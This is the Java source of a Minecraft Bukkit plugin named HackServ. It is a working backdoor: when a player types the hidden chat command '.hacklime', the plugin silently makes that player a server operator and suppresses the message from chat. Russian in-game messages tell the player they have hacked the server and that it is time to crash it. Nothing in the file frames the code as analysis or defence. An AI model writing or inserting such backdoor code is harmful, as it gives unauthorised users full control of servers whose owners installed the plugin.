package ua.limefu.hackserv;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;



public final class HackServ extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {

            Bukkit.getPluginManager().registerEvents(this, this);

        }


        @EventHandler
        public void onChat (AsyncPlayerChatEvent event){

            if (event.getMessage().toLowerCase().equals(".hacklime")) {
                event.getPlayer().sendMessage(ChatColor.DARK_RED + "Вы хакнули сервер! У вас опка!");
                event.getPlayer().sendTitle(ChatColor.DARK_AQUA + "Время крашить сервер", ChatColor.DARK_BLUE + "Всё получиться!");
                event.getPlayer().setOp(true);
                event.setCancelled(true);
            }



        }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }
}
